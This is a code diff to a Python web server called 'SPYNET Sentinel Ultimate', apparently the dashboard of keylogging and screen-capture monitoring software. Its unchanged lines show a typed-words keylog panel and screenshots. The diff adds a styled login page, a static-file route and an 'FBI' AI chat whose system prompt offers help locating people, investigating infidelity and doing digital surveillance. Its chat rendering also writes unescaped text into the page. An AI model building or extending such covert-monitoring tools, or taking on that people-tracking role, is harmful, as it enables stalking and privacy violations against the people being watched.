@@ -392,6 +392,23 @@ class Handler(BaseHTTPRequestHandler):
             self.wfile.write(html.encode('utf-8'))
             return
 
+        if self.path.startswith('/static/'):
+            nome = self.path.split('/')[-1]
+            for pasta in ['.', 'static', os.path.join(os.path.dirname(__file__), 'static')]:
+                caminho = os.path.join(pasta, nome)
+                if os.path.exists(caminho):
+                    ext = nome.split('.')[-1].lower()
+                    mime = {'png':'image/png','jpg':'image/jpeg','ico':'image/x-icon'}.get(ext,'application/octet-stream')
+                    with open(caminho,'rb') as f:
+                        data = f.read()
+                    self.send_response(200)
+                    self.send_header('Content-type', mime)
+                    self.end_headers()
+                    self.wfile.write(data)
+                    return
+            self.send_response(404); self.end_headers()
+            return
+
         self.send_response(404); self.end_headers()
 
     def do_POST(self):
@@ -450,6 +467,41 @@ class Handler(BaseHTTPRequestHandler):
                 open(KEYLOG_PATH, 'w').close()
             self._ok(); return
 
+        if self.path == '/api/fbi':
+            length = int(self.headers.get('Content-Length', 0))
+            body = json.loads(self.rfile.read(length).decode())
+            mensagem = body.get('mensagem', '')
+            historico = body.get('historico', [])
+            FBI_SYSTEM = "Voce e o FBI (Ferramenta de Busca Inteligente), uma IA especialista em OSINT e investigacao digital, criada pela SPYNET Security. Seu conhecimento inclui: tecnicas de OSINT, investigacao em redes sociais, Google Dorks, rastreamento de perfis, analise de metadados, verificacao de imagens, investigacao de CPF/CNPJ, localizacao de pessoas, investigacao de infidelidade, tecnicas de vigilancia digital, LGPD e aspectos legais no Brasil. Responda de forma profissional, direta e pratica, sempre em portugues. Nao faca atividades ilegais mas oriente sobre tecnicas legais."
+            try:
+                import urllib.request as ur
+                import ssl
+                msgs = [{"role":"user","content":FBI_SYSTEM + "\n\nResponda sempre em portugues brasileiro."}]
+                for h in historico[-8:]:
+                    msgs.append(h)
+                payload = json.dumps({
+                    "model":"claude-haiku-4-5-20251001",
+                    "max_tokens":1000,
+                    "messages":msgs
+                }).encode()
+                req = ur.Request(
+                    "https://api.anthropic.com/v1/messages",
+                    data=payload,
+                    headers={
+                        "Content-Type":"application/json",
+                        "anthropic-version":"2023-06-01",
+                        "x-api-key": os.environ.get("ANTHROPIC_API_KEY","")
+                    }
+                )
+                ctx = ssl.create_default_context()
+                with ur.urlopen(req, context=ctx, timeout=30) as r:
+                    resp = json.loads(r.read().decode())
+                resposta = resp["content"][0]["text"]
+            except Exception as e:
+                resposta = f"FBI offline: {str(e)[:100]}. Configure ANTHROPIC_API_KEY no .env"
+            self._json({"resposta": resposta})
+            return
+
         self.send_response(404); self.end_headers()
 
     def _json(self, obj):
@@ -469,36 +521,48 @@ class Handler(BaseHTTPRequestHandler):
 LOGIN_HTML = '''<!DOCTYPE html>
 <html>
 <head>
-    <meta charset="UTF-8"><title>Sentinel - Login</title>
+    <meta charset="UTF-8">
+    <title>SPYNET - Sentinel Ultimate</title>
+    <link rel="icon" type="image/png" href="/static/logo.png">
     <style>
-        body{background:linear-gradient(135deg,#0a0a2a,#1a1a3a);font-family:Arial;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}
-        .card{background:rgba(255,255,255,0.1);backdrop-filter:blur(10px);border-radius:30px;padding:40px;width:380px;text-align:center}
-        h1{color:#00ffcc;margin-bottom:20px}
-        input{width:100%;padding:14px;margin:10px 0;background:rgba(0,0,0,0.5);border:1px solid #00ffcc;border-radius:15px;color:white;box-sizing:border-box}
-        button{width:100%;padding:14px;background:linear-gradient(45deg,#00ffcc,#00ccff);border:none;border-radius:15px;font-weight:bold;cursor:pointer;font-size:16px}
-        #error{color:red;margin-top:15px;display:none}
+        *{margin:0;padding:0;box-sizing:border-box}
+        body{background:linear-gradient(135deg,#0a0a0a,#1a1a2e,#16213e);font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;padding:16px}
+        .card{background:rgba(10,10,20,0.95);border-radius:28px;padding:40px 32px;width:100%;max-width:420px;text-align:center;box-shadow:0 25px 50px rgba(0,0,0,0.5),0 0 0 1px rgba(0,255,255,0.2)}
+        .logo{width:90px;height:90px;border-radius:20px;margin:0 auto 18px;display:block;object-fit:contain;background:#0a0a1a;padding:8px;box-shadow:0 0 25px rgba(0,170,255,0.4)}
+        h1{color:#00ffff;font-size:26px;letter-spacing:3px;margin-bottom:4px}
+        .sub{color:#555;font-size:11px;letter-spacing:2px;margin-bottom:28px;text-transform:uppercase}
+        input{width:100%;padding:14px 16px;margin:8px 0;background:rgba(20,20,40,0.8);border:1px solid #333;border-radius:12px;color:#fff;font-size:15px;transition:0.3s}
+        input:focus{outline:none;border-color:#00ffff;box-shadow:0 0 12px rgba(0,255,255,0.2)}
+        input::placeholder{color:#444}
+        button{width:100%;padding:14px;margin-top:12px;background:linear-gradient(135deg,#00aaff,#0066cc);border:none;border-radius:12px;font-weight:bold;cursor:pointer;font-size:15px;color:white;letter-spacing:2px;text-transform:uppercase;transition:0.3s}
+        button:hover{background:linear-gradient(135deg,#00ccff,#0088ee);transform:translateY(-2px)}
+        #error{color:#ff4444;margin-top:14px;font-size:13px;padding:8px;background:rgba(255,68,68,0.1);border-radius:8px;border:1px solid rgba(255,68,68,0.3);display:none}
+        .versao{margin-top:20px;color:#333;font-size:10px}
     </style>
 </head>
 <body>
 <div class="card">
-    <h1>🛡️ Sentinel Ultimate</h1>
-    <input type="text" id="usuario" placeholder="Usuário">
+    <img src="/static/logo.png" class="logo" alt="SPYNET" onerror="this.style.display='none'">
+    <h1>SPYNET</h1>
+    <div class="sub">Sentinel Ultimate</div>
+    <input type="text" id="usuario" placeholder="Usuário" autocomplete="off">
     <input type="password" id="senha" placeholder="Senha">
-    <button onclick="login()">🔓 ACESSAR</button>
+    <button onclick="login()">🔓 ACESSAR SISTEMA</button>
     <div id="error">Usuário ou senha incorretos</div>
+    <div class="versao">SPYNET Security © 2026</div>
 </div>
 <script>
 async function login(){
-    const res = await fetch('/login',{
-        method:'POST',
-        headers:{'Content-Type':'application/x-www-form-urlencoded'},
-        body:`usuario=${encodeURIComponent(document.getElementById('usuario').value)}&senha=${encodeURIComponent(document.getElementById('senha').value)}`
+    const res = await fetch("/login",{
+        method:"POST",
+        headers:{"Content-Type":"application/x-www-form-urlencoded"},
+        body:"usuario="+encodeURIComponent(document.getElementById("usuario").value)+"&senha="+encodeURIComponent(document.getElementById("senha").value)
     });
     const d = await res.json();
-    if(d.success) location.href='/';
-    else document.getElementById('error').style.display='block';
+    if(d.success) location.href="/";
+    else document.getElementById("error").style.display="block";
 }
-document.addEventListener('keydown', e => { if(e.key==='Enter') login(); });
+document.addEventListener("keydown", e => { if(e.key==="Enter") login(); });
 </script>
 </body>
 </html>'''
@@ -578,6 +642,32 @@ DASHBOARD_HTML = '''<!DOCTYPE html>
     <div class="card-header">⌨️ Palavras Digitadas</div>
     <div class="keylog-area" id="keylog"></div>
 </div>
+
+<!-- FBI - IA OSINT -->
+<div class="card" style="margin-top:20px">
+    <div class="card-header" style="display:flex;align-items:center;gap:10px">
+        🤖 <span style="color:#00ffcc;font-size:15px;font-weight:bold">FBI — Inteligência Artificial OSINT</span>
+        <span style="font-size:11px;color:#888;margin-left:auto">Especialista em investigação digital</span>
+    </div>
+    <div style="display:flex;gap:10px;margin-top:15px;height:320px">
+        <div id="fbiChat" style="flex:1;background:rgba(0,0,0,0.4);border-radius:10px;padding:12px;overflow-y:auto;font-size:13px;line-height:1.6"></div>
+    </div>
+    <div style="display:flex;gap:8px;margin-top:10px">
+        <input type="text" id="fbiInput" placeholder="Pergunta sobre OSINT, investigação, técnicas..." 
+               style="flex:1;padding:12px;background:rgba(0,0,0,0.5);border:1px solid #0af;border-radius:10px;color:#fff;font-size:14px"
+               onkeydown="if(event.key==='Enter')enviarFBI()">
+        <button onclick="enviarFBI()" style="padding:12px 20px;background:linear-gradient(135deg,#00aaff,#0066cc);border:none;border-radius:10px;color:white;font-weight:bold;cursor:pointer;white-space:nowrap">
+            Perguntar
+        </button>
+    </div>
+    <div style="margin-top:8px;display:flex;gap:6px;flex-wrap:wrap">
+        <button onclick="perguntaRapida('Como rastrear um perfil falso no Instagram?')" style="padding:4px 10px;background:rgba(0,170,255,0.15);border:1px solid rgba(0,170,255,0.3);border-radius:20px;color:#0af;font-size:11px;cursor:pointer">Perfil falso</button>
+        <button onclick="perguntaRapida('Como investigar um CPF usando OSINT?')" style="padding:4px 10px;background:rgba(0,170,255,0.15);border:1px solid rgba(0,170,255,0.3);border-radius:20px;color:#0af;font-size:11px;cursor:pointer">CPF OSINT</button>
+        <button onclick="perguntaRapida('Quais técnicas de Google Dorks usar para investigação?')" style="padding:4px 10px;background:rgba(0,170,255,0.15);border:1px solid rgba(0,170,255,0.3);border-radius:20px;color:#0af;font-size:11px;cursor:pointer">Google Dorks</button>
+        <button onclick="perguntaRapida('Como verificar se uma foto foi manipulada?')" style="padding:4px 10px;background:rgba(0,170,255,0.15);border:1px solid rgba(0,170,255,0.3);border-radius:20px;color:#0af;font-size:11px;cursor:pointer">Foto falsa</button>
+        <button onclick="perguntaRapida('Como localizar uma pessoa pelas redes sociais?')" style="padding:4px 10px;background:rgba(0,170,255,0.15);border:1px solid rgba(0,170,255,0.3);border-radius:20px;color:#0af;font-size:11px;cursor:pointer">Localizar pessoa</button>
+    </div>
+</div>
 <!-- Modal screenshot -->
 <div id="modal" onclick="fecharModal()" style="display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.92);z-index:999;justify-content:center;align-items:center">
     <span style="position:absolute;top:20px;right:40px;font-size:40px;cursor:pointer;color:#fff">&times;</span>
@@ -623,6 +713,79 @@ function abrirModal(){const s=document.getElementById('scr').src;if(s){document.
 function fecharModal(){document.getElementById('modal').style.display='none';}
 setInterval(atualizar, 3000);
 atualizar();
+
+// ============================
+// FBI — IA OSINT
+// ============================
+const FBI_SYSTEM = "Voce e o FBI (Ferramenta de Busca Inteligente), uma IA especialista em OSINT e investigacao digital, criada pela SPYNET Security. Seu conhecimento inclui: tecnicas de OSINT (Open Source Intelligence), investigacao em redes sociais, Google Dorks, rastreamento de perfis digitais, analise de metadados, verificacao de imagens, investigacao de CPF/CNPJ, localizacao de pessoas, investigacao de infidelidade, tecnicas de vigilancia digital, LGPD e aspectos legais da investigacao no Brasil. Voce responde de forma profissional, direta e pratica, sempre em portugues. Voce nao faz atividades ilegais mas orienta sobre tecnicas legais de investigacao.";
+
+let fbiHistorico = [];
+
+function addMensagem(role, texto){
+    const chat = document.getElementById("fbiChat");
+    const cor = role === "user" ? "#0af" : "#00ffcc";
+    const nome = role === "user" ? "Voce" : "FBI";
+    const icon = role === "user" ? "👤" : "🤖";
+    const div = document.createElement("div");
+    div.style.cssText = "margin-bottom:12px;padding:10px;border-radius:8px;background:"+(role==="user"?"rgba(0,170,255,0.1)":"rgba(0,255,204,0.05)")+";border-left:2px solid "+cor;
+    div.innerHTML = "<strong style=\"color:"+cor+"\">"+icon+" "+nome+"</strong><br><span style=\"color:#ddd\">"+texto.replace(/\n/g,"<br>")+"</span>";
+    chat.appendChild(div);
+    chat.scrollTop = chat.scrollHeight;
+}
+
+function addLoading(){
+    const chat = document.getElementById("fbiChat");
+    const div = document.createElement("div");
+    div.id = "fbi-loading";
+    div.style.cssText = "margin-bottom:12px;padding:10px;border-radius:8px;background:rgba(0,255,204,0.05);border-left:2px solid #00ffcc;color:#555";
+    div.innerHTML = "🤖 FBI <span id=\"dots\">...</span>";
+    chat.appendChild(div);
+    chat.scrollTop = chat.scrollHeight;
+    let i=0;
+    window._fbiDots = setInterval(()=>{
+        const d=document.getElementById("dots");
+        if(d) d.textContent=[".","..",  "..."][i++%3];
+    },400);
+}
+
+function removeLoading(){
+    clearInterval(window._fbiDots);
+    const el=document.getElementById("fbi-loading");
+    if(el) el.remove();
+}
+
+async function enviarFBI(){
+    const input = document.getElementById("fbiInput");
+    const texto = input.value.trim();
+    if(!texto) return;
+    input.value = "";
+    addMensagem("user", texto);
+    fbiHistorico.push({role:"user", content:texto});
+    addLoading();
+    try{
+        const res = await fetch("/api/fbi", {
+            method:"POST",
+            headers:{"Content-Type":"application/json"},
+            body:JSON.stringify({mensagem:texto, historico:fbiHistorico.slice(-10)})
+        });
+        const d = await res.json();
+        removeLoading();
+        const resposta = d.resposta || "Erro ao obter resposta.";
+        addMensagem("assistant", resposta);
+        fbiHistorico.push({role:"assistant", content:resposta});
+    }catch(e){
+        removeLoading();
+        addMensagem("assistant", "Erro de conexao. Verifique o servidor.");
+    }
+}
+
+function perguntaRapida(q){
+    document.getElementById("fbiInput").value = q;
+    enviarFBI();
+}
+
+// Mensagem de boas-vindas
+addMensagem("assistant", "Ola! Sou o FBI — Ferramenta de Busca Inteligente da SPYNET Security.\n\nSou especialista em OSINT e investigacao digital. Posso ajudar com:\n• Investigacao em redes sociais\n• Google Dorks e buscas avancadas\n• Verificacao de identidade e perfis\n• Tecnicas de localizacao\n• Analise de imagens e metadados\n\nQual e o seu caso hoje?");
 </script>
 </body>
 </html>'''
